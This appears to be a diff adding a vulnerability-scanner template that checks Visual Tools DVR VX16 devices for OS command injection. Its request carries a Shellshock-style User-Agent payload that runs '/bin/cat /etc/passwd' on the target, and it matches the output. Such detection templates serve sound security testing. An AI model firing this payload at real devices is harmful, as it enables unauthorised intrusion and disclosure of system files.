@@ -1,0 +1,30 @@
+http:
+- matchers:
+  - regex:
+    - root:.*:0:0
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - 'GET /cgi-bin/slogin/login.py HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd
+
+    '
+id: visual-tools-dvr-rce
+info:
+  author: gy741
+  description: vulnerabilities in the web-based management interface of Visual Tools
+    DVR VX16 4.2.28.0 could allow an authenticated, remote attacker to perform command
+    injection attacks against an affected device.
+  name: Visual Tools DVR VX16 4.2.28.0 - OS Command Injection (Unauthenticated)
+  reference:
+  - https://www.exploit-db.com/exploits/50098
+  severity: critical
+  tags: visualtools,rce,oast,injection
